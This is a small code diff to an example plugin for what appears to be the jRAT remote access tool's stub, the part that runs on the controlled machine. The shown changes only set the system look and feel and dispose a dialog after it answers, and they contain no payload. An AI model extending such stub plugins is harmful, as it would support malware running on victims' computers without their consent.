@@ -3,6 +3,8 @@ package pro.jrat.stub;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
+import javax.swing.UIManager;
+
 import pro.jrat.api.stub.StubPlugin;
 
 public class ExampleStubPlugin extends StubPlugin {
@@ -70,6 +72,9 @@ public class ExampleStubPlugin extends StubPlugin {
 						}
 						
 						answer.onAnswer();
+						
+						answer.setVisible(false);
+						answer.dispose();
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
@@ -84,7 +89,7 @@ public class ExampleStubPlugin extends StubPlugin {
 
 	@Override
 	public void onEnable() throws Exception {
-		
+		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 	}
 
 }
